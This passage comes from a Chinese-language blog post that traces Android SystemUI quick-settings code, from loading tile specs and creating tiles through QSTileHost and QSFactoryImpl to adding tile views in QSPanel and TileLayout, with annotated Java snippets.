class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onTuningChanged</span><span class="params">(String key, String newValue)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!TILES_SETTING.equals(key)) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (DEBUG) Log.d(TAG, <span class="string">&quot;Recreating tiles&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (newValue == <span class="literal">null</span> &amp;&amp; UserManager.isDeviceInDemoMode(mContext)) &#123;</span><br><span class="line">        newValue = mContext.getResources().getString(R.string.quick_settings_tiles_retail_mode);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//调用 QSTileHost#loadTileSpecs，获得 config 里字符串信息</span></span><br><span class="line">    <span class="keyword">final</span> List&lt;String&gt; tileSpecs = loadTileSpecs(mContext, newValue);</span><br><span class="line">    <span class="type">int</span> <span class="variable">currentUser</span> <span class="operator">=</span> ActivityManager.getCurrentUser();</span><br><span class="line">    <span class="keyword">if</span> (tileSpecs.equals(mTileSpecs) &amp;&amp; currentUser == mCurrentUser) <span class="keyword">return</span>;</span><br><span class="line">    <span class="comment">//进行了过滤</span></span><br><span class="line">    mTiles.entrySet().stream().filter(tile -&gt; !tileSpecs.contains(tile.getKey())).forEach(</span><br><span class="line">            tile -&gt; &#123;</span><br><span class="line">                <span class="keyword">if</span> (DEBUG) Log.d(TAG, <span class="string">&quot;Destroying tile: &quot;</span> + tile.getKey());</span><br><span class="line">                tile.getValue().destroy();</span><br><span class="line">            &#125;);</span><br><span class="line">    <span class="keyword">final</span> LinkedHashMap&lt;String, QSTile&gt; newTiles = <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (String tileSpec : tileSpecs) &#123;</span><br><span class="line">        <span class="type">QSTile</span> <span class="variable">tile</span> <span class="operator">=</span> mTiles.get(tileSpec);</span><br><span class="line">        <span class="keyword">if</span> (tile != <span class="literal">null</span> &amp;&amp; (!(tile <span class="keyword">instanceof</span> CustomTile)</span><br><span class="line">                || ((CustomTile) tile).getUser() == currentUser)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (tile.isAvailable()) &#123;</span><br><span class="line">                <span class="keyword">if</span> (DEBUG) Log.d(TAG, <span class="string">&quot;Adding &quot;</span> + tile);</span><br><span class="line">                tile.removeCallbacks();</span><br><span class="line">                <span class="keyword">if</span> (!(tile <span class="keyword">instanceof</span> CustomTile) &amp;&amp; mCurrentUser != currentUser) &#123;</span><br><span class="line">                    tile.userSwitch(currentUser);</span><br><span class="line">                &#125;</span><br><span class="line">                newTiles.put(tileSpec, tile);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                tile.destroy();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (DEBUG) Log.d(TAG, <span class="string">&quot;Creating tile: &quot;</span> + tileSpec);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">//这里通过 字符串 一个个实例化 Tile</span></span><br><span class="line">                tile = createTile(tileSpec);</span><br><span class="line">                <span class="keyword">if</span> (tile != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (tile.isAvailable()) &#123;</span><br><span class="line">                        tile.setTileSpec(tileSpec);</span><br><span class="line">                        <span class="comment">// put 到 Map 中</span></span><br><span class="line">                        newTiles.put(tileSpec, tile);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        tile.destroy();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">                Log.w(TAG, <span class="string">&quot;Error creating tile for spec: &quot;</span> + tileSpec, t);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    mCurrentUser = currentUser;</span><br><span class="line">    mTileSpecs.clear();</span><br><span class="line">    mTileSpecs.addAll(tileSpecs);</span><br><span class="line">    mTiles.clear();</span><br><span class="line">    <span class="comment">// put 到 Map 中</span></span><br><span class="line">    mTiles.putAll(newTiles);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mCallbacks.size(); i++) &#123;</span><br><span class="line">        <span class="comment">//注册，当开发状态改变时回调</span></span><br><span class="line">        mCallbacks.get(i).onTilesChanged();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有两个重要的方法：一个是获取 config 里字符串信息 loadTileSpecs(mContext, newValue)；一个实例化 Tile 的 createTile(tileSpec)。<br>先看第一个 QSTileHost#loadTileSpecs() 这里和Android 10 有点出入。<br><strong>com.android.systemui.qs.QSTileHost.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">static</span> List&lt;String&gt; <span class="title function_">loadTileSpecs</span><span class="params">(Context context, String tileList)</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">Resources</span> <span class="variable">res</span> <span class="operator">=</span> context.getResources();</span><br><span class="line">    <span class="comment">// tileList 为空，则获取一个 “default” 字符串</span></span><br><span class="line">    <span class="keyword">if</span> (TextUtils.isEmpty(tileList)) &#123;</span><br><span class="line">        tileList = res.getString(R.string.quick_settings_tiles);</span><br><span class="line">        <span class="keyword">if</span> (DEBUG) Log.d(TAG, <span class="string">&quot;Loaded tile specs from config: &quot;</span> + tileList);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (DEBUG) Log.d(TAG, <span class="string">&quot;Loaded tile specs from setting: &quot;</span> + tileList);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">final</span> ArrayList&lt;String&gt; tiles = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;();</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">addedDefault</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">    Set&lt;String&gt; addedSpecs = <span class="keyword">new</span> <span class="title class_">ArraySet</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (String tile : tileList.split(<span class="string">&quot;,&quot;</span>)) &#123;</span><br><span class="line">        tile = tile.trim();</span><br><span class="line">        <span class="keyword">if</span> (tile.isEmpty()) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="comment">// 第一次 tileList 为空，取了默认值，</span></span><br><span class="line">        <span class="keyword">if</span> (tile.equals(<span class="string">&quot;default&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!addedDefault) &#123;</span><br><span class="line">                <span class="comment">// 从 config 文件获取</span></span><br><span class="line">                List&lt;String&gt; defaultSpecs = getDefaultSpecs(context);</span><br><span class="line">                <span class="keyword">for</span> (String spec : defaultSpecs) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (!addedSpecs.contains(spec)) &#123;</span><br><span class="line">                        tiles.add(spec);</span><br><span class="line">                        addedSpecs.add(spec);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                addedDefault = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (!addedSpecs.contains(tile)) &#123;</span><br><span class="line">                tiles.add(tile);</span><br><span class="line">                addedSpecs.add(tile);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 省略其他代码......</span></span><br><span class="line">    <span class="keyword">return</span> tiles;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码中第一次 tileList 为空，调用了 getDefaultSpecs(context) 获取字符串，该方法比较简单，这里就不做分析了。<br>接着看第二个  QSTileHost#createTile(tileSpec) 方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> QSTile <span class="title function_">createTile</span><span class="params">(String tileSpec)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mQsFactories.size(); i++) &#123;</span><br><span class="line">            <span class="type">QSTile</span> <span class="variable">t</span> <span class="operator">=</span> mQsFactories.get(i).createTile(tileSpec);</span><br><span class="line">            <span class="keyword">if</span> (t != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> t;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// M: @ &#123;</span></span><br><span class="line">        <span class="keyword">if</span> (mQuickSettingsExt != <span class="literal">null</span> &amp;&amp; mQuickSettingsExt.doOperatorSupportTile(tileSpec)) &#123;</span><br><span class="line">            <span class="comment">// WifiCalling</span></span><br><span class="line">            <span class="keyword">return</span> (QSTile) mQuickSettingsExt.createTile(<span class="built_in">this</span>, tileSpec);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// @ &#125;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里调用 QSFactory#createTile()，而 QSFactory 接口又由 QSFactoryImpl 实现。所以这里直接看 QSFactoryImpl #createTile()：<br><strong>com.android.systemui.qs.tileimpl.QSFactoryImpl.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> QSTile <span class="title function_">createTile</span><span class="params">(String tileSpec)</span> &#123;</span><br><span class="line">    <span class="type">QSTileImpl</span> <span class="variable">tile</span> <span class="operator">=</span> createTileInternal(tileSpec);</span><br><span class="line">    <span class="keyword">if</span> (tile != <span class="literal">null</span>) &#123;</span><br><span class="line">        tile.handleStale(); <span class="comment">// Tile was just created, must be stale.</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> tile;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> QSTileImpl <span class="title function_">createTileInternal</span><span class="params">(String tileSpec)</span> &#123;</span><br><span class="line">    <span class="comment">// 省略其他代码......</span></span><br><span class="line">    <span class="comment">// Stock tiles.</span></span><br><span class="line">    <span class="keyword">switch</span> (tileSpec) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;wifi&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> mWifiTileProvider.get();</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;internet&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> mInternetTileProvider.get();</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;bt&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> mBluetoothTileProvider.get();</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;cell&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> mCellularTileProvider.get();</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;dnd&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> mDndTileProvider.get();</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;inversion&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> mColorInversionTileProvider.get();</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;airplane&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> mAirplaneModeTileProvider.get();</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;work&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> mWorkModeTileProvider.get();</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;rotation&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> mRotationLockTileProvider.get();</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;flashlight&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> mFlashlightTileProvider.get();</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;location&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> mLocationTileProvider.get();</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;cast&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> mCastTileProvider.get();</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;hotspot&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> mHotspotTileProvider.get();</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;battery&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> mBatterySaverTileProvider.get();</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;saver&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> mDataSaverTileProvider.get();</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;night&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> mNightDisplayTileProvider.get();</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;nfc&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> mNfcTileProvider.get();</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;dark&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> mUiModeNightTileProvider.get();</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;screenrecord&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> mScreenRecordTileProvider.get();</span><br><span class="line">            <span class="comment">// 省略其他代码......</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 省略其他代码......</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到这里通过对应的字符串分别实例化了对应的 Tile。</p><h2 id="2、QS显示"><a href="#2、QS显示" class="headerlink" title="2、QS显示"></a>2、QS显示</h2><p>以上涉及资源文件加载及对应实例化，接下来看看如何显示出来的。和Android 11 对比出入有点大，加了一个控制器。<br>这里要回到 QSFragment#onViewCreated() 方法：<br><strong>com.android.systemui.qs.QSFragment.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onViewCreated</span><span class="params">(View view, <span class="meta">@Nullable</span> Bundle savedInstanceState)</span> &#123;</span><br><span class="line">    <span class="type">QSFragmentComponent</span> <span class="variable">qsFragmentComponent</span> <span class="operator">=</span> mQsComponentFactory.create(<span class="built_in">this</span>);</span><br><span class="line">    mQSPanelController = qsFragmentComponent.getQSPanelController();</span><br><span class="line">    mQuickQSPanelController = qsFragmentComponent.getQuickQSPanelController();</span><br><span class="line">    mQSFooterActionController = qsFragmentComponent.getQSFooterActionController();</span><br><span class="line">    <span class="comment">// 一些初始化，init() 是 抽象类 ViewController 的 public 方法。</span></span><br><span class="line">    mQSPanelController.init();</span><br><span class="line">    mQuickQSPanelController.init();</span><br><span class="line">    mQSFooterActionController.init();</span><br><span class="line">    <span class="comment">// 扩展的 qs 滚动视图</span></span><br><span class="line">    mQSPanelScrollView = view.findViewById(R.id.expanded_qs_scroll_view); </span><br><span class="line">    <span class="comment">// 省略其他代码......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经过上述分析，我们来看看 ViewController#init()：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (mInited) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    onInit();    <span class="comment">// 要在 onViewAttached() 方法之前运行，</span></span><br><span class="line">    mInited = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span> (isAttachedToWindow()) &#123;</span><br><span class="line">        <span class="comment">// 调用内部 onViewAttachedToWindow() 方法，去添加视图。</span></span><br><span class="line">        mOnAttachStateListener.onViewAttachedToWindow(mView);</span><br><span class="line">    &#125;</span><br><span class="line">    addOnAttachStateChangeListener(mOnAttachStateListener);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="type">OnAttachStateChangeListener</span> <span class="variable">mOnAttachStateListener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OnAttachStateChangeListener</span>() &#123;</span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onViewAttachedToWindow</span><span class="params">(View v)</span> &#123;</span><br><span class="line">          <span class="comment">// 调用自己的抽象方法 onViewAttached() ，在子类具体实现，添加 Tiles.</span></span><br><span class="line">          ViewController.<span class="built_in">this</span>.onViewAttached();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onViewDetachedFromWindow</span><span class="params">(View v)</span> &#123;</span><br><span class="line">          ViewController.<span class="built_in">this</span>.onViewDetached();</span><br><span class="line">      &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这个添加在 QSPanelController 的父类 QSPanelControllerBase 中的 onViewAttached() 方法中。<br>QSPanelControllerBase#onViewAttached()<br><strong>com.android.systemui.qs.QSPanelControllerBase.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onViewAttached</span><span class="params">()</span> &#123;</span><br><span class="line">    mQsTileRevealController = createTileRevealController();</span><br><span class="line">    <span class="keyword">if</span> (mQsTileRevealController != <span class="literal">null</span>) &#123;</span><br><span class="line">        mQsTileRevealController.setExpansion(mRevealExpansion);</span><br><span class="line">    &#125;</span><br><span class="line">    mMediaHost.addVisibilityChangeListener(mMediaHostVisibilityListener);</span><br><span class="line">    mView.addOnConfigurationChangedListener(mOnConfigurationChangedListener);</span><br><span class="line">    mHost.addCallback(mQSHostCallback);</span><br><span class="line">    <span class="comment">// 这里设置 Tiles</span></span><br><span class="line">    setTiles();</span><br><span class="line">    mLastOrientation = getResources().getConfiguration().orientation;</span><br><span class="line">    switchTileLayout(<span class="literal">true</span>);</span><br><span class="line">    mDumpManager.registerDumpable(mView.getDumpableTag(), <span class="built_in">this</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/** */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setTiles</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 这里 getTiles() 就是获取，前面我们说的 Tiles 实例，在 QSTileHost 中。</span></span><br><span class="line">    setTiles(mHost.getTiles(), <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/** */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setTiles</span><span class="params">(Collection&lt;QSTile&gt; tiles, <span class="type">boolean</span> collapsedView)</span> &#123;</span><br><span class="line">    <span class="comment">// TODO(b/168904199): move this logic into QSPanelController.</span></span><br><span class="line">    <span class="keyword">if</span> (!collapsedView &amp;&amp; mQsTileRevealController != <span class="literal">null</span>) &#123;</span><br><span class="line">        mQsTileRevealController.updateRevealedTiles(tiles);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (QSPanelControllerBase.TileRecord record : mRecords) &#123;</span><br><span class="line">        mView.removeTile(record);</span><br><span class="line">        record.tile.removeCallback(record.callback);</span><br><span class="line">    &#125;</span><br><span class="line">    mRecords.clear();</span><br><span class="line">    mCachedSpecs = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (QSTile tile : tiles) &#123;</span><br><span class="line">        addTile(tile, collapsedView);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">addTile</span><span class="params">(<span class="keyword">final</span> QSTile tile, <span class="type">boolean</span> collapsedView)</span> &#123;</span><br><span class="line">    <span class="comment">// 这里会创建对应的视图。</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">TileRecord</span> <span class="variable">r</span> <span class="operator">=</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">TileRecord</span>(tile, mHost.createTileView(getContext(), tile, collapsedView));</span><br><span class="line">    <span class="comment">// 注意：这个  mView 是 QSPanel，在 QSPanelController 的构造方法通过super传到 QSPanelControllerBase 的。这里也是视图的添加。</span></span><br><span class="line">    mView.addTile(r);</span><br><span class="line">    mRecords.add(r);</span><br><span class="line">    mCachedSpecs = getTilesSpecs();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里只需关注QSPanel#addTile():<br><strong>com.android.systemui.qs.QSPanel.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">addTile</span><span class="params">(QSPanelControllerBase.TileRecord tileRecord)</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> QSTile.<span class="type">Callback</span> <span class="variable">callback</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">QSTile</span>.Callback() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onStateChanged</span><span class="params">(QSTile.State state)</span> &#123;</span><br><span class="line">            drawTile(tileRecord, state);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    tileRecord.tile.addCallback(callback);</span><br><span class="line">    tileRecord.callback = callback;</span><br><span class="line">    tileRecord.tileView.init(tileRecord.tile);</span><br><span class="line">    tileRecord.tile.refreshState();</span><br><span class="line">    <span class="keyword">if</span> (mTileLayout != <span class="literal">null</span>) &#123;</span><br><span class="line">        mTileLayout.addTile(tileRecord);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由 TileLayout#addTile() 实现:<br><strong>com.android.systemui.qs.TileLayout.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addTile</span><span class="params">(TileRecord tile)</span> &#123;</span><br><span class="line">    mRecords.add(tile);</span><br><span class="line">    tile.tile.setListening(<span class="built_in">this</span>, mListening);</span><br><span class="line">    addTileView(tile);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">addTileView</span><span class="params">(TileRecord tile)</span> &#123;</span><br><span class="line">    <span class="comment">// 注：TileLayout 继承的是 ViewGroup。</span></span><br><span class="line">    addView(tile.tileView);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至此，SystemUI 下拉状态栏快捷开关模块代码流程分析完毕。<br>QS一个有3种呈现方式，如图：<br><img src="/images/20230522/Screenshot_20230522-205519.jpg"></p><p>我这分析的是第 2 种。其他的展示方法也类似。<br><strong>res/layout/qs_panel.xml</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 